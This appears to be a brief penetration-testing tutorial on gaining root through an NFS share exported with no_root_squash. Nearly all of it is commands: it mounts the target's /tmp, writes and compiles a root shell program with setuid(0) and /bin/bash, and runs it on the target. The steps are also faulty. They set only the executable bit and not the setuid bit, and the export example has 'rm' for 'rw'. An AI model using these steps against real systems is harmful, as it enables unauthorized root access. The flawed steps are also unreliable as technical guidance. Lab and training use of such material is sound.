**Root Squashing** is a security feature in NFS that prevents unauthorized root-level access to the NFS server by client machines.

To identify is root squashing exists, run **_`cat /etc/exports`_** and look for **_`no_root_squash`_** mentioned with respect to any folder.

**Example:** **_`/tmp *(rm,sync,insecure,no_root_squash,no_subtree_check)`_**

The above example states that the **_`/tmp`_** folder is mountable and on our attack machine.

- To verify if any folder on the target machine is mountable, run **_`showmount -e <target IP>`_**. This will list the folder on the target machine which is mountable on our attack machine.

- First, create a folder within your local **_`/tmp`_** directory such as **_`mkdir /tmp/mountme`_**. Next, to mount the **_`/tmp`_** folder onto **_`/tmp/mountme`_**, run
**_`mount -o rw,vers=2 <target IP>:/tmp /tmp/mountme`_**

- Next, we create a malicious **_.c_** file under the **_`/tmp/mountme`_** folder using:
**_`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/shell.c`_**

Next, compile the created **_.c_** file using **_`gcc /tmp/mountme/shell.c -o /tmp/mountme/shell`_**, and then set the executable bit for the compiled malicious binary using **_`chmod +x /tmp/mountme/shell`_**

**NOTE:** Ignore any warnings displayed within the compilation output. 

- Now, navigate to the **_`/tmp`_** folder on the target machine and run **_`ls`_** to list the contents. You should now see the newly compiled malicious binary under the **_`/tmp`_** folder on the target machine. 

- Execute the binary and your privileges will be elevated to root user.
***
